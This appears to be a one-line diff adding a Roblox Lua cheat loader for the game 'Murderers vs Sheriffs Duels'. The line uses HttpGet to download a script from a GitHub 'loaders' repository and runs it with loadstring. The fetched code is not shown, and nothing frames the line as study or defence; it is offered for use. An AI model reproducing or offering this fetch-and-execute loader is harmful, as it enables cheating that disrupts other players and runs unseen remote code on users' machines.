@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/mvsd-murderers-vs-sheriffs-duels-spam4-8yd1php9hfgn1o.lua"))()
